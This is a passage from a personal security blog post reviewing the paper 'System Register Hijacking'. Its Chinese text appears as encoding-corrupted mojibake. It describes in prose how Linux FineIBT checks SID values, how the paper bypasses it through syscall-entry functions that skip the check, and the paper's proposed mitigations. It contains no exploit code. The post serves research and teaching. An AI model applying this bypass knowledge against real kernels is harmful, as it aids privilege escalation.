<p>æ¯ä¸ªå‡½æ•°éƒ½ä¼šæœ‰ä¸€ä¸ªè‡ªå·±çš„ SID å€¼ï¼Œå½“ç¨‹åºåœ¨ call æˆ–è€… jmp åˆ°ä¸€ä¸ªå‡½æ•°å‰ä¼šå…ˆè®¾ç½®ä¸€ä¸ª SID å€¼æ¥è¡¨ç¤ºä»–è¦ call æˆ–è€… jmp çš„æ˜¯è¿™ä¸€ç±» SID çš„å‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°çš„å¼€å¤´ä¼šå…ˆè¿›è¡Œ SID çš„æ ¡éªŒï¼Œå¦‚æœ SID ä¸ä¸€è‡´ç¨‹åºå°†ä¼šåœæ­¢è¿è¡Œï¼Œè€Œ SID ä¸€è‡´çš„è¯åˆ™ä¼šç»§ç»­æ‰§è¡Œè¯¥å‡½æ•°ã€‚  </p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œmain å‡½æ•°åœ¨ call ä¹‹å‰å°† SID è®¾ç½®ä¸º 0xc00010ffï¼Œå³å°† 0xc00010ff èµ‹å€¼ç»™ eax å¯„å­˜å™¨ã€‚å½“ call çš„å‡½æ•°ä¸º func0 æ—¶ï¼Œé€šè¿‡æ£€éªŒå‘ç° eax å¯„å­˜å™¨çš„æŒ‡ä¸º 0xc00010ffï¼Œç„¶åè·³è½¬åˆ° func0_entry æ¥ç»§ç»­æ‰§è¡Œ func0 å‡½æ•°ã€‚è€Œå¦‚æœ main å‡½æ•° call çš„æ˜¯ func1 å‡½æ•°æ—¶ï¼Œç”±äº SID æ ¡éªŒä¸é€šè¿‡ï¼ˆfunc1 SID çš„å€¼ä¸º 0xbaddcafeï¼‰ï¼Œåˆ™ä¼šå‘ä¸‹æ‰§è¡Œ hlt æŒ‡ä»¤æ¥è®©ç¨‹åºåœæ­¢è¿è¡Œã€‚  </p>
<p>è€Œåœ¨ linux ä¸­ FineIBT é•¿ä¸‹å›¾è¿™ä¸ªæ ·ï¼š  </p>
<img src="/2025/11/07/srh/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>æ¯ä¸ªï¼ˆå…¶å®ä¹Ÿä¸æ˜¯ï¼‰å‡½æ•°éƒ½ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„ _<em>cfi</em> å‰ç¼€çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸º endbrï¼Œç„¶ååé¢æ¥ç€çš„æ˜¯ SID æ ¡éªŒï¼Œå½“æ ¡éªŒæˆåŠŸæ—¶æ‰ä¼šè·³è½¬åˆ°çœŸæ­£çš„å‡½æ•°å…¥å£ï¼Œè€ŒçœŸæ­£çš„å‡½æ•°æ˜¯æ²¡æœ‰ endbr æŒ‡ä»¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•é€šè¿‡ä»»æ„åœ°å€ call&#x2F;jmp åŸè¯­æ¥ç›´æ¥è°ƒç”¨ä»–ã€‚  </p>
<p>ä»‹ç»å®Œ FineIBT åï¼Œæ¥çœ‹çœ‹ä½œè€…æ˜¯å¦‚ä½•ç»•è¿‡è¿™ä¸ªä¿æŠ¤çš„ã€‚åŸç†å¾ˆç®€å•  </p>
<img src="/2025/11/07/srh/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½œè€…å‘ç°æœ‰è®¸å¤šä¸ syscall å…¥å£ç›¸å…³çš„å‡½æ•°éƒ½æœ‰ endbr æŒ‡ä»¤ä½†æ˜¯ä¸éœ€è¦è¿›è¡Œ SID æ ¡éªŒï¼Œè€Œåˆšå¥½ä»–æå‡ºçš„ swapgs Stack Pivoting ç”¨çš„å°±æ˜¯è¿™äº›å‡½æ•°ï¼Œæ‰€ä»¥åŸç†å°±æ˜¯è¿™ä¹ˆç®€å•ğŸ¤£ğŸ¤£ğŸ¤£  </p>
<p>ä½œè€…åœ¨åé¢ä¹Ÿæå‡ºäº†ä»–å‰é¢æ‰€æå‡ºçš„å„ç§åˆ©ç”¨æ–¹æ³•å¯¹åº”çš„ç¼“è§£æªæ–½ï¼Œå¯¹äºè¿™ä¸ª FineIBT ç»•è¿‡çš„ Mitigation å°±æ˜¯ç»™è¿™äº›å‡½æ•°éƒ½åŠ ä¸Š _<em>cfi</em> ğŸ¤£ğŸ¤£ğŸ¤£  </p>
<p>è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ç°è±¡æ˜¯å½“æˆ‘ä»¬ç›´æ¥å» IDA ä¸­å»çœ‹è¿™ä¸ª _<em>cfi</em> å‡½æ•°æ—¶ä¼šå‘ç°é‡Œé¢å…¨æ˜¯ nopï¼Œè€ŒçœŸæ­£çš„å‡½æ•°å…¥å£å¤„æœ‰ endbrï¼Œæ ¹æœ¬èµ·ä¸åˆ°é˜²å¾¡çš„ä½œç”¨ï¼Œè€Œå½“æˆ‘ä»¬åœ¨å¯åŠ¨çš„æ—¶å€™å¼€å¯äº† FineIBT é€‰é¡¹å kernel åœ¨åŠ è½½è¿›å†…å­˜åä»–ä¼šåŠ¨æ€ä¿®æ”¹ä»–çš„ä»£ç æ®µï¼Œåœ¨ _<em>cfi</em> ä¸ŠåŠ ä¸Š endbr ä»¥åŠä¸€äº› SID çš„æ ¡éªŒæ“ä½œï¼Œç„¶åå°†çœŸæ­£çš„å‡½æ•°å…¥å£å¤„çš„ endbr æ”¹æˆ nopï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š  </p>
<img src="/2025/11/07/srh/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>ä½œè€…åœ¨è®ºæ–‡çš„æœ€åæå‡ºäº†åº”å¯¹å„ç§åˆ©ç”¨æ‰‹æ³•çš„ Mitigationï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š  </p>
<p><strong>cr0&#x2F;cr4:</strong><br>æ‰©å±• CR-Pinning: æŠŠå…³é”®æ§åˆ¶å¯„å­˜å™¨çš„å®‰å…¨ä½ï¼ˆå¦‚ CR0.WP ã€ CR4.SMEP&#x2F;SMAP ï¼‰å›ºå®šä¸ºæœŸæœ›å€¼ï¼Œå¹¶å¯¹ä»»ä½•ä¿®æ”¹è¿™äº›ä½çš„å°è¯•è¿›è¡Œæ‹¦æˆªã€æ ¡éªŒæˆ–æ‹’ç»<br><strong>lidt:</strong><br>è¿™äº› lidt gadgetå¯ä»¥é€šè¿‡å¼ºåˆ¶å…¶å€¼å§‹ç»ˆè®¾ç½®ä¸ºå®ƒä»¬æ‰€åœ¨çš„ä½ç½®çš„å¸¸é‡è™šæ‹Ÿåœ°å€æ¥ç¼“è§£ã€‚åœ¨ç°ä»£ PML4 Linux ä¸Šï¼Œè¿™å§‹ç»ˆæ˜¯ 0xfffffe0000000000ã€‚åœ¨ä»»ä½• lidt æŒ‡ä»¤åå¯¹å€¼è¿›â¾åæ£€æŸ¥å¹¶é‡ç½®å…¶å€¼åº” è¯¥â¾œä»¥é˜²â½Œå…¶è¢«æ»¥â½¤ã€‚<br><strong>popf:</strong><br>è¯¥ç±»æŒ‡ä»¤æ•°é‡å¤ªå¤šï¼Œæš‚æ— è¾ƒå¥½çš„æ–¹æ³•<br><strong>swapgs:</strong><br>å¯¹æ¥â¾ƒâ½¤â¼¾ç©ºé—´çš„ GSBase å€¼ è¿›â¾æ£€æµ‹<br><strong>FineIBT bypass:</strong><br>ç»™æ¼ç½‘ä¹‹é±¼å‡½æ•°éƒ½åŠ ä¸Š_cfi_</p>
<p>ä»”ç»†ä¸€çœ‹è¿™äº› Mitigation è¿˜çœŸçš„æ˜¯â€œç®€å•ç²—æš´â€å•ŠğŸ¤” </p>
<p>è¯´åˆ°åº•ï¼Œè¿™ç¯‡è®ºæ–‡æå‡ºçš„å„ç§ç³»ç»Ÿå¯„å­˜å™¨çš„åŠ«æŒæ‰‹æ®µåœ¨éå¸¸å¤šå¹´å‰å°±ç»™ç”¨æ‰€ç”¨è¿‡äº†ã€‚å¯èƒ½è®©äººæ¯”è¾ƒé™Œç”Ÿçš„æ˜¯å¯¹ gsbase çš„åŠ«æŒï¼Œå¯æ˜¯è¿™ç©æ„ä¹Ÿåœ¨ 2014 å¹´çš„ä¸€ä¸ª cve ä¸Šè¢«äººåˆ©ç”¨è¿‡ï¼Œä»¥åŠåœ¨è®¸å¤šé«˜è´¨é‡çš„ CTF æ¯”èµ›ä¸­éƒ½è¢«æ‹¿æ¥å‡ºè¿‡é¢˜ï¼Œæˆ‘åœ¨ä¸‹å›¾ä¸­ç®€å•çš„ä¸¾äº†å‡ ä¸ªä¾‹å­ï¼Œæ„Ÿå…´è¶£çš„è¯å¯ä»¥å»çœ‹çœ‹ï¼š  </p>
<img src="/2025/11/07/srh/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>æ‰€ä»¥è¿™ç¯‡è®ºæ–‡çš„åˆ›æ–°ç‚¹åœ¨å“ªé‡Œå‘¢ï¼Œå°±æ˜¯æ‰¾åˆ°äº†å‡ ä¸ªæ¯”è¾ƒå¥½ç”¨çš„ gadget å’Œæå‡ºäº†ä¸€äº›éå¸¸â€œç®€å•ç²—æš´â€çš„ Mitigationï¼ŸğŸ¤”  </p>
<p>é‚£æˆ‘å°±å¾ˆçº³é—·äº†ï¼Œä¸ºä»€ä¹ˆè¿™ä¹Ÿèƒ½å¤Ÿå‘é¡¶ä¼šï¼Œäºæ˜¯æˆ‘å’Œæˆ‘çš„å°ä¼™ä¼´ä»¬å±•å¼€äº†è®¨è®ºï¼š  </p>
<img src="/2025/11/07/srh/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>æœ€ç»ˆç»“è®ºæ˜¯ä½œè€…çš„æ–‡ç¬”æ¯”è¾ƒå¥½ï¼Œæ‰€ä»¥èƒ½å‘é¡¶ä¼šğŸ¤£  </p>
<h2 id="å†™é“æœ€å"><a href="#å†™é“æœ€å" class="headerlink" title="å†™é“æœ€å"></a>å†™é“æœ€å</h2><p>å¦‚æœä»¥åæˆ‘ç»„ä¼šåˆ†äº«çš„å†…å®¹æˆ‘æ„Ÿè§‰æœ‰æ„æ€çš„è¯åº”è¯¥ä¹Ÿä¼šæ›´æ–°åˆ°åšå®¢ä¸Šæ¥:)  </p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><strong>CET</strong><br><a target="_blank" rel="noopener" href="https://linuxkernel.org.cn/doc/html/latest/arch/x86/shstk.html">https://linuxkernel.org.cn/doc/html/latest/arch/x86/shstk.html</a><br><strong>CFI</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Iflyinsky/p/18328698">https://www.cnblogs.com/Iflyinsky/p/18328698</a><br><a target="_blank" rel="noopener" href="https://tjtech.me/kernel-cfi-failure-analysis.html">https://tjtech.me/kernel-cfi-failure-analysis.html</a><br><a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">https://clang.llvm.org/docs/ControlFlowIntegrity.html</a><br><strong>BTI</strong><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/370947458#:~:text=BTI%E7%9A%84%E5%85%A8%E7%A7%B0%E6%98%AFbranch%20target%20indentificating%EF%BC%8C%E6%98%AF,Armv8.5%20%E5%A2%9E%E5%8A%A0%E7%9A%84%E9%99%90%E5%88%B6%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E6%9D%A5%E8%A7%A3%E5%86%B3JOP%EF%BC%88jump-oriented%20programming%EF%BC%89%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E3%80%82">https://zhuanlan.zhihu.com/p/370947458#:~:text=BTI%E7%9A%84%E5%85%A8%E7%A7%B0%E6%98%AFbranch%20target%20indentificating%EF%BC%8C%E6%98%AF,Armv8.5%20%E5%A2%9E%E5%8A%A0%E7%9A%84%E9%99%90%E5%88%B6%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E6%9D%A5%E8%A7%A3%E5%86%B3JOP%EF%BC%88jump-oriented%20programming%EF%BC%89%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E3%80%82</a><br><strong>FS&#x2F;GS</strong><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/435518616">https://zhuanlan.zhihu.com/p/435518616</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/434821566">https://zhuanlan.zhihu.com/p/434821566</a><br><strong>percpu</strong><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/363969903">https://zhuanlan.zhihu.com/p/363969903</a><br><strong>IBT</strong><br><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/828785.html">https://cn-sec.com/archives/828785.html</a><br><strong>THP</strong><br><a target="_blank" rel="noopener" href="https://www.modb.pro/db/402621?utm_source=index_ai">https://www.modb.pro/db/402621?utm_source=index_ai</a><br><strong>FineIBT</strong><br><a target="_blank" rel="noopener" href="https://dl.acm.org/doi/fullHtml/10.1145/3607199.3607219">https://dl.acm.org/doi/fullHtml/10.1145/3607199.3607219</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Linux_Everything/article/details/146357554">https://blog.csdn.net/Linux_Everything/article/details/146357554</a><br><strong>System Register Hijacking</strong><br><a target="_blank" rel="noopener" href="https://hongkai.org/slides/sec25_System_Register_Hijacking_slides.pdf">https://hongkai.org/slides/sec25_System_Register_Hijacking_slides.pdf</a><br><strong>Swapgs</strong><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458305132&idx=1&sn=be19372c359a3de431828ec1448dc93a&chksm=b181f2e686f67bf0cd07fe04cb761349334caca84469f600163d1d32f7003ee62f306647bc20&scene=27">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458305132&amp;idx=1&amp;sn=be19372c359a3de431828ec1448dc93a&amp;chksm=b181f2e686f67bf0cd07fe04cb761349334caca84469f600163d1d32f7003ee62f306647bc20&amp;scene=27</a><br><strong>Retspill</strong><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/699064533">https://zhuanlan.zhihu.com/p/699064533</a><br><strong>CR-Pinning</strong><br><a target="_blank" rel="noopener" href="https://patchew.org/linux/20251007065119.148605-1-sohil.mehta@intel.com/20251007065119.148605-6-sohil.mehta@intel.com/">https://patchew.org/linux/20251007065119.148605-1-sohil.mehta@intel.com/20251007065119.148605-6-sohil.mehta@intel.com/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">Link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">å†™åœ¨æœ€å‰é¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Register-Hijacking"><span class="toc-number">2.</span> <span class="toc-text">System Register Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E9%81%93%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">å†™é“æœ€å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">4.</span> <span class="toc-text">reference</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/11/07/srh/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/11/07/srh/&text=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/11/07/srh/&is_video=false&description=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=è®ºæ–‡åˆ†äº«: System Register Hijacking&body=Check out this article: https://qanux.github.io/2025/11/07/srh/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/11/07/srh/&name=è®ºæ–‡åˆ†äº«: System Register Hijacking&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/11/07/srh/&t=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
